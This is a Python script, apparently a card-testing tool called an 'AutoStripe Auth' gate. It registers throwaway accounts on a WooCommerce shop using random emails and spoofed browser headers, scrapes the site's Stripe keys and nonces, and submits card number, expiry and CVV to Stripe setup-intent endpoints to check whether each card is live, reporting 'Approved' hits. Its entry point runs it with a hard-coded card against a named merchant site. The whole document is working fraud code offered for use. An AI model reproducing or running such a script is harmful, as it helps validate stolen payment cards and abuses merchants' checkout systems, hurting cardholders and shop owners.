from time import sleep
import time
import asyncio, httpx, requests, re, base64, json, random, string, html, uuid, traceback, quickjs, ua_generator
from urllib.parse import urlparse
from urllib.parse import quote, unquote
import urllib.parse
from bs4 import BeautifulSoup
from datetime import datetime

FIRST = ["Liam","Noah","Olivia","Emma","Ava","Isabella","Sophia","Mia","Amelia","James","Ethan","Aiden","Lucas","Mason","Furkan","Arjun","Kabir","Zara","Aisha"]
LAST  = ["Smith","Johnson","Brown","Williams","Jones","Miller","Davis","Wilson","Taylor","Clark","Martin","Singh","Patel","Khan","Sharma","Verma","Gupta","Desai","Malik","Hussain"]
DOMAINS = ["gmail.com","outlook.com","yahoo.com","hotmail.com","proton.me"]
f = random.choice(FIRST)
l = random.choice(LAST)
base = (f[0] + l).lower()
suffix = str(random.randint(10, 999))
domain = random.choice(DOMAINS)
email = f"{base}{suffix}@{domain}"
now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
ua = ua_generator.generate()
schclient = ua.headers.get()
user_agent = schclient.get('User-Agent')

def fetch(data, first, last):
  try:
      start = data.index(first) + len(first)

      end = data.index(last, start)

      return data[start:end]

  except ValueError:
      return

async def register(nonce, domain, session):
    try:
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': f'https://{domain}',
            'priority': 'u=0, i',
            'referer': f'https://{domain}/my-account',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        headers.update(schclient)

        data = {
            'email': f'{email}',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': f'https://{domain}/my-account/add-payment-method',
            'wc_order_attribution_session_start_time': f'{now}',
            'wc_order_attribution_session_pages': '8',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': f'{user_agent}',
            'woocommerce-register-nonce': f'{nonce}',
            '_wp_http_referer': '/my-account',
            'register': 'Register',
        }

        try:
            request = await session.post(f'https://{domain}/my-account', headers=headers, data=data, follow_redirects=True)
            if request.status_code != 200:
                request = await session.post(f'https://{domain}/my-account/', headers=headers, data=data, follow_redirects=True)
        except Exception:
            return False

        if "logout" in request.text:
            return True
    
    except Exception as e:
        return False

def var_extractor(text):
    target = (
        "wc_stripe_params",
        "wcpay_upe_config",
        "wc_stripe_credit_card_params",
        "wc_stripe_upe_params",
    )
    
    soup = BeautifulSoup(text, "html.parser")
    ctx = quickjs.Context()

    for script in soup.find_all("script"):
        js = script.string
        if not js:
            continue

        try:
            ctx.eval(js)
        except Exception:
            pass
        
        for var in target:
            try:
                result = ctx.eval(
                    f"typeof {var} !== 'undefined' ? JSON.stringify({var}) : null"
                )
                if result and result != "null":
                    return var, json.loads(result)
            except Exception:
                pass

    return None, None

async def jsone_consumer(prm, data):
    
    data = json.loads(data)
        
    if "wc_stripe_params" in prm:
        pk = data.get('key')
        nonce = data.get('add_card_nonce')
            
    if "wcpay_upe_config" in prm:
        pk = data.get('publishableKey')
        nonce = data.get('createSetupIntentNonce')
        
    if "wc_stripe_upe_params" in prm:
        pk = data.get('key')
        nonce = data.get('createAndConfirmSetupIntentNonce')
        
    if "confirm" in prm:
        pk = data.get("api_key")
        nonce = data.get("rest_nonce")
    
    return {'pk_live': pk, 'nonce': nonce}

async def stripe_auth(card, url, session):
    status = None
    response = None
    start = time.time()
    
    try:
        headers = {}
        headers.update(schclient)

        cc,mm,yy,cvv = map(str.strip,card.split("|"))

        parsed = urlparse(url)
        if parsed:
            domain = parsed.netloc
        else:
            domain = url.split("//")[1]

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
            'priority': 'u=0, i',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        headers.update(schclient)

        request = await session.get(f'https://{domain}/my-account/', headers=headers)
        print(f"My Account: {request.status_code}")
        if 200 <= request.status_code < 300:
            nonce = fetch(request.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
            
            if nonce:
                is_register = await register(nonce, domain, session)
            else:
                status = False
                response = f'Failed to get Register Nonce'
                return
        else:
            status = False
            response = f'Failed to get regi_nonce({request.status_code})'
            return

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
            'priority': 'u=0, i',
            'referer': f'https://{domain}/my-account/payment-methods/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        headers.update(schclient)

        request = await session.get(f'https://{domain}/my-account/add-payment-method/', headers=headers)
        print(f"Add payment method: {request.status_code}")
        if 200 <= request.status_code < 300:
            var_name, text_json = var_extractor(request.text)
            jsone = json.dumps(text_json)
            
            if "confirmParams" in jsone:
                prm = "confirm"
            else:
                prm = var_name
            
            if "acct_" in request.text:
                match = re.search(r"acct_[A-Za-z0-9]+", request.text)
                if match:
                    acct = match.group(0)
                    
            value_data = await jsone_consumer(prm, jsone)
            pk = value_data.get('pk_live')
            nonce = value_data.get('nonce')
        else:
            status = False
            response = f'Failed to add-payment-method({request.status_code})'
            return
        
        
        if 'confirm' in prm:
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': f'https://{domain}',
                'priority': 'u=1, i',
                'referer': f'https://{domain}/my-account/add-payment-method/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-requested-with': 'XMLHttpRequest',
            }
            headers.update(schclient)

            data = {
                'payment_method': 'stripe_cc',
                '_wpnonce': f'{nonce}',
                'context': 'add_payment_method',
            }

            request = await session.post(
                f'https://{domain}/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent',
                headers=headers,
                data=data,
            )
            try:
                cs_data = request.json()
                cs = cs_data.get('intent').get('client_secret')
                si = cs_data.get('intent').get('id')
            except:
                status = False
                response = f'Failed to get cs-si(Confirm)'
                return
            
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
            }
            headers.update(schclient)

            data = f'return_url=https%3A%2F%2F{domain}%2Fwc-api%2Fstripe_add_payment_method%2F%3Fnonce%3D{nonce}%26payment_method%3Dstripe_cc%26context%3Dadd_payment_method&mandate_data[customer_acceptance][type]=online&mandate_data[customer_acceptance][online][ip_address]=27.59.93.128&mandate_data[customer_acceptance][online][user_agent]={user_agent}&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][email]={email}&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={yy}&payment_method_data[card][exp_month]={mm}&payment_method_data[allow_redisplay]=unspecified&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F3233cbd46e%3B+stripe-js-v3%2F3233cbd46e%3B+payment-element%3B+deferred-intent&payment_method_data[referrer]=https%3A%2F%2F{domain}&payment_method_data[time_on_page]=19569702&payment_method_data[client_attribution_metadata][client_session_id]=53005d41-8a26-476e-8616-eaf271751a88&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=deferred&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=merchant_specified&payment_method_data[client_attribution_metadata][elements_session_config_id]=8fb5594a-6a6c-4759-a794-4da30a5b6008&payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]=payment&payment_method_data[guid]=9b236db0-3cea-4b6c-9e57-8811c16ef430dc773b&payment_method_data[muid]=8c3524de-9ba5-43ea-9b56-0766e745c176e0d1c1&payment_method_data[sid]=40cb8dad-60c1-46b1-b0bb-b93e3302e22f79aaed&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&_stripe_account={acct}&_stripe_version=2022-08-01&client_attribution_metadata[client_session_id]=53005d41-8a26-476e-8616-eaf271751a88&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=8fb5594a-6a6c-4759-a794-4da30a5b6008&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_secret={cs}'

            request = await session.post(
                f'https://api.stripe.com/v1/setup_intents/{si}/confirm',
                headers=headers,
                data=data,
            )
            try:
                if request.status_code == 200:
                    status = True
                    response = 'Approved:1000 ✅'
                    return
                else:
                    status = True
                    response = request.json()['error']['message']
                    return
                    
            except:
                status = False
                response = 'Failed to get response (confirm)'
                return
            
        if "wcpay_upe_config" in prm:
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
            }
            headers.update(schclient)

            data = f'billing_details[name]=+&billing_details[email]={email}&billing_details[address][country]=US&type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2F1239285b29%3B+stripe-js-v3%2F1239285b29%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2F{domain}&time_on_page=61415604&client_attribution_metadata[client_session_id]=d23298de-b104-49d8-9a07-f4d78700e598&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=e708510e-1132-402f-93c8-4f8d9ba6aef7&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=9b236db0-3cea-4b6c-9e57-8811c16ef430dc773b&muid=373b2be2-c9f3-4206-a27c-b3d1a202528ce53c08&sid=705a5e18-c569-47db-bb49-973b86b1cdee9c8970&key={pk}&_stripe_account={acct}'

            request = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
            try:
                pm = request.json()['id']
            except Exception:
                status = False
                response = f'Failed to get pm(wcpay_upe_config)'
                return
                
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
                'origin': f'https://{domain}',
                'priority': 'u=1, i',
                'referer': f'https://{domain}/my-account/add-payment-method/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            }
            headers.update(schclient)

            files = {
                'action': (None, 'create_setup_intent'),
                'wcpay-payment-method': (None, f'{pm}'),
                '_ajax_nonce': (None, f'{nonce}'),
            }

            request = await session.post(f'https://{domain}/wp-admin/admin-ajax.php', headers=headers, files=files)
            try:
                res = request.json()['data']
                if 'error' in res:
                    status = True
                    response = res.get('error').get('message')
                    return
                elif 'succeeded' in res:
                    status = True
                    response = res.get('error').get('message')
                    return
            except:
                status = False
                response = 'Error in getting response (wc_st_prm)'
                return
            
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
        }
        headers.update(schclient)

        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2Fc3ec434e35%3B+stripe-js-v3%2Fc3ec434e35%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2F{domain}&time_on_page=251141&client_attribution_metadata[client_session_id]=fa24dca8-f751-41ba-9a6a-85e0ed9fd3b1&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=449948df-9b83-44ab-8321-62462fdd1a48&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=9b236db0-3cea-4b6c-9e57-8811c16ef430dc773b&muid=622112a7-bf84-4bf4-8465-ecd77812b9c588cf53&sid=f78dfd19-b79c-4a08-b203-98880ee0033b7ae9a0&key={pk}&_stripe_version=2024-06-20'

        request = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
            pm = request.json()['id']
        except Exception:
            status = False
            response = f'Failed to get pm(general)'
            return
        
        if "wc_stripe_params" in prm:
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': f'https://{domain}',
                'priority': 'u=1, i',
                'referer': f'https://{domain}/my-account/add-payment-method/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'x-requested-with': 'XMLHttpRequest',
            }
            headers.update(schclient)

            params = {
                'wc-ajax': 'wc_stripe_create_setup_intent',
            }

            data = {
                'stripe_source_id': f'{pm}',
                'nonce': f'{nonce}',
            }

            request = await session.post(f'https://{domain}/', params=params, headers=headers, data=data)
            if 'error' in request.text:
                status = True
                response = request.json()['error']['message']
                return
            elif 'success' in request.text:
                status = True
                response = 'Approved:1000 ✅'
                return
            else:
                status = False
                response = 'Error in getting response (wc_st_prm)'
                return
            
        if "wc_stripe_upe_params" in prm:
            headers = {
                'Referer': f'https://{domain}/my-account/add-payment-method/',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            }
            headers.update(schclient)

            data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': f'{pm}',
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': f'{nonce}',
            }

            request = await session.post(f'https://{domain}/wp-admin/admin-ajax.php', headers=headers, data=data)
            
            try:
                res = request.json()['data']
                if 'error' in res:
                    status = True
                    response = res.get('error').get('message')
                    return
                elif 'succeeded' in res:
                    status = True
                    response = res.get('error').get('message')
                    return
            except:
                status = False
                response = 'Error in getting response (wc_st_prm)'
                return
            
    except Exception as e:
        status = False
        response = str(e)
        print(f"{e}")
        print(traceback.format_exc())
        return
        
    finally:
        end = time.time()
        took = end - start
        print({'status': status, 'response': response, 'took': f'{took:.2f}s', 'gate': 'AutoStripe Auth', 'card': f'{card}'})

async def main():
    
    async with httpx.AsyncClient(timeout=90) as session:
        await stripe_auth("4833120194926748|11|2029|913", "https://ethosconceptstore.com/my-account", session)

if __name__ == "__main__":
    asyncio.run(main())
